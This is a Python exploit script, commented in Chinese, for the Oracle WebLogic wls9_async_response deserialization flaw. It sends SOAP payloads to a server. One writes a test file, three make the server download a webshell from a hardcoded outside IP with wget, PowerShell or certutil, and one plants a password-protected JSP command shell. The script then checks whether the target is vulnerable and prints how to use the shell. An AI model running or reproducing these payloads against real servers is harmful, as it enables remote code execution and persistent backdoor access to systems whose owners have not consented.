# CNVD-C-2019-48814 Weblogic wls9_async_response 反序列化
# 参考连接：https://www.jianshu.com/p/c4982a845f55?utm_campaign=hugo&utm_medium=reader_share&utm_content=note&utm_source=weixin-friends&from=groupmessage&isappinstalled=0&tdsourcetag=s_pcqq_aiomsg
# 靶场搭建 https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271
# 会在bea_wls_internal目录下生成test.jsp
# 测试文件地址：   http://ip:port/bea_wls_internal/test.jsp
# 木马地址：       http://ip:port/bea_wls_internal/test1.jsp
# auther:ske

import requests
import sys

# 在自己服务器上放上webshell马
your_webshell_url = 'http://155.138.223.1/webshell.txt'

# 纯检测，生成文件/bea_wls_internal/test.jsp
test_payload = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string><void method="println"><string><![CDATA[{}]]></string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>

'''.format('test CNVD-C-2019-48814')

# 利用wget下载木马，木马地址：bea_wls_internal/test1.jsp
linux_payload = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>wget {} -O servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test1.jsp</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
'''.format(your_webshell_url)

# 利用powershell下载木马，木马地址：bea_wls_internal/test1.jsp
windows_payload_powershell = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>cmd</string>
</void>
<void index="1">
<string>/c</string>
</void>
<void index="2">
<string>powershell (new-object System.Net.WebClient).DownloadFile( '{}','servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test1.jsp')</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
'''.format(your_webshell_url)

# 利用certutil下载木马，木马地址：bea_wls_internal/test1.jsp
windows_payload_certutil = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>cmd</string>
</void>
<void index="1">
<string>/c</string>
</void>
<void index="2">
<string>certutil -urlcache -split -f {} servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test1.jsp</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
'''.format(your_webshell_url)

# 无需公网，直接传shell
webshell_payload = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test1.jsp</string><void method="println"><string><![CDATA[
<%
    if("123".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;          
        byte[] b = new byte[1024];          
        out.print("<pre>");          
        while((a=in.read(b))!=-1){
            out.println(new String(b));          
        }
        out.print("</pre>");
    } 
    %>]]>
</string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
'''

headers = {"Content-Type": "text/xml",
           "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36"
           }

# 检测是否存在漏洞
def check_vul():
    try:
        attack_url = url + '/_async/AsyncResponseService'
        requests.post(url=attack_url, data=test_payload, headers=headers, timeout=10)
        jsp_path = url + '/bea_wls_internal/test.jsp'
        status_code = requests.get(url=jsp_path, headers=headers, timeout=10).status_code
        if status_code == 200:
            print("[+] 测试文件地址 : {}".format(jsp_path))
            return True
        else:
            print('[-] [{}] 不存在漏洞'.format(url))
    except Exception as e:
        print('[-] Error : {}'.format(e.args))

# 下载webshell
def download_webshell():
    try:
        attack_url = url + '/_async/AsyncResponseService'
        requests.post(url=attack_url, data=webshell_payload, headers=headers, timeout=10)
        jsp_path = url + '/bea_wls_internal/test1.jsp'
        status_code = requests.get(url=jsp_path, headers=headers, timeout=10).status_code
        if status_code == 200:
            print("[+] 木马地址 : {}".format(jsp_path))
            print("[+] 使用方法：{}?pwd=123&cmd=whoami".format(jsp_path))
        else:
            print('[-] 木马下载失败'.format(url))
    except Exception as e:
        print('[-] Error : {}'.format(e.args))

if __name__ == '__main__':
    # url = sys.argv[1]

    # 搭建的靶场，可供大家测试
    url = 'http://155.138.223.1:7001'
    print('测试漏洞 [{}] :CNVD-C-2019-48814 Weblogic wls9_async_response 反序列化'.format(url))
    if check_vul():
        download_webshell()

